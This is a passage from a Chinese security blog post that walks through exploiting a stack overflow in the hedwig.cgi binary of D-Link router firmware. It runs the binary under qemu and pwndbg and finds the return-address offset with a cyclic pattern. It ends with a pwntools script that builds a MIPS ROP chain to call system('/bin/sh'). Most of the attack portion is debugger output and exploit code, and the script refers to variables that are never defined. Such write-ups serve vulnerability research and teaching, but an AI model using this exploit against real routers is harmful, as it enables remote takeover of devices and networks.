class="line">───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────</span><br><span class="line"> ► 0x767e9a00    move   $t9, $ra</span><br><span class="line">   0x767e9a04    bal    0x767e9a0c</span><br><span class="line">   0x767e9a08    nop    </span><br><span class="line">   0x767e9a0c    lui    $gp, 2</span><br><span class="line">   0x767e9a10    addiu  $gp, $gp, -0x39fc</span><br><span class="line">   0x767e9a14    addu   $gp, $gp, $ra</span><br><span class="line">   0x767e9a18    move   $ra, $t9</span><br><span class="line">   0x767e9a1c    lw     $a0, -0x7fe8($gp)</span><br><span class="line">   0x767e9a20    sw     $a0, -0x7ff0($gp)</span><br><span class="line">   0x767e9a24    move   $a0, $sp</span><br><span class="line">   0x767e9a28    addiu  $sp, $sp, -0x10</span><br><span class="line">───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────</span><br><span class="line">00:0000│ sp  0x76ffea50 ◂— 0x1</span><br><span class="line">01:0004│     0x76ffea54 —▸ 0x76ffeb53 ◂— &apos;./htdocs/web/hedwig.cgi&apos;</span><br><span class="line">02:0008│     0x76ffea58 ◂— 0x0</span><br><span class="line">03:000c│     0x76ffea5c —▸ 0x76ffeb6b ◂— &apos;REMOTE_ADDR=0.0.0.0&apos;</span><br><span class="line">04:0010│     0x76ffea60 —▸ 0x76ffeb7f ◂— &apos;REQUEST_URI=/hedwig.cgi&apos;</span><br><span class="line">05:0014│     0x76ffea64 —▸ 0x76ffeb97 ◂— 0x50545448 (&apos;HTTP&apos;)</span><br><span class="line">06:0018│     0x76ffea68 —▸ 0x76fff1ab ◂— &apos;REQUEST_METHOD=POST&apos;</span><br><span class="line">07:001c│     0x76ffea6c —▸ 0x76fff1bf ◂— &apos;CONTENT_TYPE=application/x-www-form-urlencoded&apos;</span><br><span class="line">─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────</span><br><span class="line"> ► f 0 767e9a00</span><br></pre></td></tr></table></figure></p>
<p>然后让程序继续运行,此时报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x41414141 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────</span><br><span class="line"> V0   0xffffffff</span><br><span class="line"> V1   0x4b</span><br><span class="line"> A0   0x76ffe480 —▸ 0x767ae4e0 ◂— 0x0</span><br><span class="line"> A1   0x1</span><br><span class="line"> A2   0x42e000 ◂— 0x0</span><br><span class="line"> A3   0x20</span><br><span class="line"> T0   0x767ab4c8 ◂— 0x4b /* &apos;K&apos; */</span><br><span class="line"> T1   0x1309</span><br><span class="line"> T2   0x2</span><br><span class="line"> T3   0x24</span><br><span class="line"> T4   0x25</span><br><span class="line"> T5   0x807</span><br><span class="line"> T6   0x800</span><br><span class="line"> T7   0x400</span><br><span class="line"> T8   0x8</span><br><span class="line"> T9   0x0</span><br><span class="line"> S0   0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> S1   0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> S2   0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> S3   0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> S4   0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> S5   0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> S6   0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> S7   0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> S8   0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> FP   0x76ffe980 ◂— 0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> SP   0x76ffe980 ◂— 0x41414141 (&apos;AAAA&apos;)</span><br><span class="line"> PC   0x41414141 (&apos;AAAA&apos;)</span><br><span class="line">───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x41414141</span><br><span class="line">───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────</span><br><span class="line">00:0000│ fp sp  0x76ffe980 ◂— 0x41414141 (&apos;AAAA&apos;)</span><br><span class="line">... ↓</span><br><span class="line">─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────</span><br><span class="line"> ► f 0 41414141</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure></p>
<p>好了,栈溢出实锤了,之后我们改一下运行脚本,测试一下偏移<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic 600</span><br></pre></td></tr></table></figure></p>
<p>改一下程序运行脚本之后发现程序回显为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;unable to open temp file.&lt;/message&gt;&lt;/hedwig&gt;%</span><br></pre></td></tr></table></figure></p>
<p>无法打开某tmp文件,但是程序在之前是直接溢出的,那么我们先改大输入流<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 1536</span><br></pre></td></tr></table></figure></p>
<p>将运行命令改为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=20 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=`python -c &quot;print &apos;uid=123&apos;+&apos;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaap&apos;&quot;` -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;0.0.0.0&quot; -g 23946 ./htdocs/web/hedwig.cgi</span><br></pre></td></tr></table></figure></p>
<p>成功栈溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x6b61616b in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────</span><br><span class="line"> V0   0xffffffff</span><br><span class="line"> V1   0x4b</span><br><span class="line"> A0   0x76ffe480 —▸ 0x767ae4e0 ◂— 0x0</span><br><span class="line"> A1   0x1</span><br><span class="line"> A2   0x42e000 ◂— 0x0</span><br><span class="line"> A3   0x20</span><br><span class="line"> T0   0x767ab4c8 ◂— 0x4b /* &apos;K&apos; */</span><br><span class="line"> T1   0x1309</span><br><span class="line"> T2   0x2</span><br><span class="line"> T3   0x24</span><br><span class="line"> T4   0x25</span><br><span class="line"> T5   0x807</span><br><span class="line"> T6   0x800</span><br><span class="line"> T7   0x400</span><br><span class="line"> T8   0x8</span><br><span class="line"> T9   0x0</span><br><span class="line"> S0   0x6b616162 (&apos;baak&apos;)</span><br><span class="line"> S1   0x6b616163 (&apos;caak&apos;)</span><br><span class="line"> S2   0x6b616164 (&apos;daak&apos;)</span><br><span class="line"> S3   0x6b616165 (&apos;eaak&apos;)</span><br><span class="line"> S4   0x6b616166 (&apos;faak&apos;)</span><br><span class="line"> S5   0x6b616167 (&apos;gaak&apos;)</span><br><span class="line"> S6   0x6b616168 (&apos;haak&apos;)</span><br><span class="line"> S7   0x6b616169 (&apos;iaak&apos;)</span><br><span class="line"> S8   0x6b61616a (&apos;jaak&apos;)</span><br><span class="line"> FP   0x76ffe980 ◂— 0x6b61616c (&apos;laak&apos;)</span><br><span class="line"> SP   0x76ffe980 ◂— 0x6b61616c (&apos;laak&apos;)</span><br><span class="line"> PC   0x6b61616b (&apos;kaak&apos;)</span><br><span class="line">───────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x6b61616b</span><br><span class="line">───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────</span><br><span class="line">00:0000│ fp sp  0x76ffe980 ◂— 0x6b61616c (&apos;laak&apos;)</span><br><span class="line">01:0004│        0x76ffe984 ◂— 0x6b61616d (&apos;maak&apos;)</span><br><span class="line">02:0008│        0x76ffe988 ◂— 0x6b61616e (&apos;naak&apos;)</span><br><span class="line">03:000c│        0x76ffe98c ◂— 0x6b61616f (&apos;oaak&apos;)</span><br><span class="line">04:0010│        0x76ffe990 ◂— 0x6b616170 (&apos;paak&apos;)</span><br><span class="line">05:0014│        0x76ffe994 ◂— 0x6b616171 (&apos;qaak&apos;)</span><br><span class="line">06:0018│        0x76ffe998 ◂— 0x6b616172 (&apos;raak&apos;)</span><br><span class="line">07:001c│        0x76ffe99c ◂— 0x6b616173 (&apos;saak&apos;)</span><br><span class="line">─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────</span><br><span class="line"> ► f 0 6b61616b</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV</span><br></pre></td></tr></table></figure></p>
<p>此时查一下偏移量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6b61616b</span><br><span class="line">1040</span><br></pre></td></tr></table></figure></p>
<p>好的,现在我们有了偏移量,下面就可以开始构造payload了<br>在日常的栈溢出中,我们的目标是esp指针,但是在mips架构下,我们的目标就变成了$ra,因为是路由器,所以一般没有aslr,我们只需要找到基址,然后直接调用system函数即可,</p>
<p>这里提一个小trick, 在我们想写入的地址有坏字节时,可以通过先-1写入,后面依靠其他gadget来将地址加一来完成构造(比如本例中system函数是在0x53200,我们先存入减一的值,再后面再利用gadget来加一恢复</p>
<p>exp如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.endian=&quot;little&quot;</span><br><span class="line">context.arch=&quot;mips&quot;</span><br><span class="line">system_addr = 0x53200-1+0x767e9000</span><br><span class="line">add_jar = 0x159CC # addiu $s5,$sp,0x170+var_160 | jalr $s0 |</span><br><span class="line">sys_1 = 0x000158C8 # addiu $s0,1 | jalr $s5 |</span><br><span class="line">padding = &apos;uid=&apos; + &apos;a&apos; * 1013</span><br><span class="line">padding += p32(base_addr + system_addr_1)       </span><br><span class="line">padding += &apos;a&apos; * 16</span><br><span class="line">padding += p32(base_addr+add_jar)               </span><br><span class="line">padding += &apos;a&apos; * 12 </span><br><span class="line">padding += p32(base_addr + sys_1)       </span><br><span class="line">padding += &apos;a&apos; * 0x10</span><br><span class="line">padding += &apos;/bin/sh\x00&apos;</span><br><span class="line"></span><br><span class="line">with open(&quot;payload&quot;,&apos;wb&apos;) as f:</span><br><span class="line">    f.write(padding)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p>
<p>文章首发先知社区,转载请标明出处<br><a href="https://xz.aliyun.com/t/6808" target="_blank" rel="noopener">https://xz.aliyun.com/t/6808</a><br>enjoy:)</p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
                    
                        <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
                    
                </ul>
            
        </div>
        
    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>


    </div>
    
</div>


    </div>
</div>
</body>
<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/diaspora.js"></script>
<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>




</html>
